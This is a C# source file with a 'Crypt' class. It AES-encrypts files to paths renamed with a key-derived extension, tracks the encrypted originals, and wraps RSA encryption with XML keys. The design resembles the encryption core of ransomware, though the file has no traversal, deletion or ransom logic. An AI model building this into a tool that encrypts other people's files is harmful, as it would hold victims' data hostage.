using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Xml.Linq;
using System.Xml.XPath;

namespace main
{
    public class Crypt
    {
        public byte[] SignatureKey { get; private set; }
        public byte[] EncryptionKey { get; private set; }
        public byte[] EncryptionIV { get; private set; }
        public List<string> EncryptedFiles { get; private set; }

        public Crypt()
        {
            SignatureKey = GenerateRandom(64);
            EncryptionKey = GenerateRandom(16);
            EncryptionIV = GenerateRandom(16);
            EncryptedFiles = new List<string>();
        }

        public void Encrypt(string plainFilePath, string encryptedFilePath)
        {
            if (plainFilePath == encryptedFilePath) return;

            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 128;
                aes.Key = EncryptionKey;
                aes.IV = EncryptionIV;
                aes.Padding = PaddingMode.ANSIX923;
                ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);
                using (FileStream plain = File.Open(plainFilePath, FileMode.Open, FileAccess.Read, FileShare.Read))
                {
                    using (FileStream encrypted = File.Open(encryptedFilePath, FileMode.Create, FileAccess.Write, FileShare.None))
                    {
                        using (CryptoStream cs = new CryptoStream(encrypted, encryptor, CryptoStreamMode.Write))
                        {
                            plain.CopyTo(cs);
                        }
                    }
                }
            }

            EncryptedFiles.Add(plainFilePath);
        }

        public void DecryptFile(string decryptedFilePath, string encryptedFilePath, byte[] key, byte[] iv)
        {
            using (AesCryptoServiceProvider aes = new AesCryptoServiceProvider())
            {
                aes.KeySize = 128;
                aes.Key = key;
                aes.IV = iv;
                aes.Padding = PaddingMode.ANSIX923;
                ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
                using (FileStream plain = File.Open(decryptedFilePath, FileMode.Create, FileAccess.Write, FileShare.None))
                {
                    using (FileStream encrypted = File.Open(encryptedFilePath, FileMode.Open, FileAccess.Read, FileShare.Read))
                    {
                        using (CryptoStream cs = new CryptoStream(plain, decryptor, CryptoStreamMode.Write))
                        {
                            encrypted.CopyTo(cs);
                        }
                    }
                }
            }
        }

        public static byte[] RSAEncryptBytes(byte[] datas, string keyXml)
        {
            byte[] encrypted = null;
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(keyXml);
                encrypted = rsa.Encrypt(datas, true);
            }

            return encrypted;
        }

        public static byte[] RSADescryptBytes(byte[] datas, string keyXml)
        {
            byte[] decrypted = null;
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(keyXml);
                decrypted = rsa.Decrypt(datas, true);
            }

            return decrypted;
        }

        public static string GetKeyID(string xmlStringKey, int charNum)
        {
            XDocument doc = XDocument.Parse(xmlStringKey);
            XElement rsaKey = doc.Root.XPathSelectElement("./Modulus");

            return rsaKey.Value.Substring(0, charNum);
        }

        public string MakeEncryptedFilePath(string plainFilePath, string key)
        {
            string encryptedFileName = Path.GetFileNameWithoutExtension(plainFilePath) + "." + key;
            return Path.Combine(Path.GetDirectoryName(plainFilePath), encryptedFileName);
        }

        private byte[] GenerateRandom(int length)
        {
            byte[] bytes = new byte[length];
            using (RNGCryptoServiceProvider random = new RNGCryptoServiceProvider())
            {
                random.GetBytes(bytes);
            }

            return bytes;
        }
    }
}
